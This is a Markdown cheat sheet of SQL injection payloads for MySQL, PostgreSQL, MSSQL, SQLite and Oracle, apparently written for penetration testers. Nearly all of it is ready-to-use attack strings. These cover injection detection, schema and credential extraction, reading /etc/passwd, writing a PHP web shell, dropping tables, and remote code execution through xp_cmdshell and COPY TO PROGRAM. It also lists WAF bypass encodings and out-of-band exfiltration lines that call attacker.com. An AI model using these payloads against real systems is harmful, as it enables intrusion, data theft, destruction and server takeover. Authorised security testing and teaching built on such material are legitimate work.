# SQL Injection Payloads

## Detection Payloads

### Boolean-Based
```
' OR 1=1--
' OR 1=1#
' OR '1'='1
" OR "1"="1
' OR 1=1-- -
') OR 1=1--
') OR ('1'='1
1' AND 1=1--
1' AND 1=2--
```

### Time-Based Blind
```sql
# MySQL
' OR SLEEP(5)--
' AND SLEEP(5)--
1' AND (SELECT SLEEP(5))--
' OR BENCHMARK(10000000,SHA1('test'))--

# PostgreSQL
' OR pg_sleep(5)--
'; SELECT pg_sleep(5)--
1' AND (SELECT pg_sleep(5))--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5)) AS x)--

# SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Error-Based
```sql
# MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=1/(SELECT 0 FROM pg_sleep(0) WHERE 1=CAST((SELECT version()) AS INT))--

# MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sysdatabases)--
```

### UNION-Based
```sql
# Column count detection
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Data extraction (adjust column count)
' UNION SELECT 1,2,3--
' UNION SELECT version(),user(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Database-Specific Payloads

### MySQL
```sql
# Version
SELECT @@version;
SELECT version();

# Current user/database
SELECT user();
SELECT database();

# List databases
SELECT schema_name FROM information_schema.schemata;

# List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read files
SELECT LOAD_FILE('/etc/passwd');

# Write files
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php';

# Stacked queries
; DROP TABLE users;--
```

### PostgreSQL
```sql
SELECT version();
SELECT current_user;
SELECT current_database();
SELECT datname FROM pg_database;
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read files
SELECT pg_read_file('/etc/passwd');
COPY (SELECT '') TO PROGRAM 'id';

# Large object RCE
SELECT lo_import('/etc/passwd');
```

### MSSQL
```sql
SELECT @@version;
SELECT user_name();
SELECT db_name();
SELECT name FROM master..sysdatabases;
SELECT name FROM sysobjects WHERE xtype='U';
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users');

# RCE via xp_cmdshell
EXEC xp_cmdshell 'whoami';
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';

# Read files
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
```

### SQLite
```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';
```

### Oracle
```sql
SELECT banner FROM v$version WHERE ROWNUM=1;
SELECT user FROM dual;
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

## WAF Bypass Techniques

### Whitespace Alternatives
```sql
'/**/OR/**/1=1--
' OR\t1=1--
'%09OR%091=1--
'%0aOR%0a1=1--
'%0dOR%0d1=1--
'+OR+1=1--
```

### Case Manipulation
```sql
' oR 1=1--
' Or 1=1--
' uNiOn SeLeCt 1,2,3--
```

### Encoding
```sql
# URL encoding
%27%20OR%201%3D1--
# Double URL encoding
%2527%2520OR%25201%253D1--
# Unicode
%u0027 OR 1=1--
# Hex
0x27204f5220313d312d2d
```

### Keyword Bypass
```sql
# UNION alternatives
' UNI/**/ON SEL/**/ECT 1,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UNION ALL SELECT 1,2,3--
'||(SELECT 1)||'

# Comment tricks
'/*! OR */1=1--
' OR 1=1;%00
' OR 1=1\x00

# No spaces
'OR(1=1)--
'AND(SELECT+1)--
```

### Blind Extraction Without Common Functions
```sql
# MySQL without SLEEP
' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--
# String comparison
' AND SUBSTRING(user(),1,1)='r'--
' AND ASCII(SUBSTRING(user(),1,1))>96--
# Binary search for character values
' AND ORD(MID(user(),1,1))>64--
```

## Second-Order SQLi Patterns
```
# Register username containing SQL payload:
Username: admin'--
# Later, when username is used in a query:
SELECT * FROM logs WHERE username='admin'--'

# Profile update with injection:
Bio field: test', role='admin' WHERE username='attacker'--
```

## Out-of-Band (OOB) Extraction
```sql
# MySQL DNS exfiltration
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'));

# MSSQL DNS exfiltration
EXEC master..xp_dirtree '\\attacker.com\a';
DECLARE @x VARCHAR(1024);SET @x=db_name();EXEC('master..xp_dirtree "\\'+@x+'.attacker.com\a"');

# PostgreSQL
COPY (SELECT version()) TO PROGRAM 'curl https://attacker.com/?v=data';

# Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
```

## Common Injection Points
- Login forms (username and password fields)
- Search functionality (`?q=`, `?search=`, `?query=`)
- Sort/order parameters (`?sort=`, `?order=`, `?orderby=`)
- Filter parameters (`?filter=`, `?category=`, `?type=`)
- ID parameters (`?id=`, `?uid=`, `?pid=`)
- API endpoints (JSON body values, GraphQL variables)
- Cookie values
- HTTP headers (X-Forwarded-For, Referer, User-Agent)
- File names in upload/download endpoints

## Impact Escalation
1. **Confirm injection** → boolean/time-based detection
2. **Identify database** → version fingerprinting
3. **Extract schema** → table and column enumeration
4. **Extract data** → credentials, PII, tokens
5. **File read** → /etc/passwd, config files, source code
6. **File write** → web shell upload
7. **RCE** → xp_cmdshell (MSSQL), COPY TO PROGRAM (PostgreSQL)

## Report Impact Statement
> SQL injection in [component] allows an unauthenticated attacker to extract the contents of the application's database, including user credentials, personal data, and session tokens. This could lead to full account takeover of all users, including administrators. Depending on database privileges, this may also allow reading sensitive files from the server or achieving remote code execution.
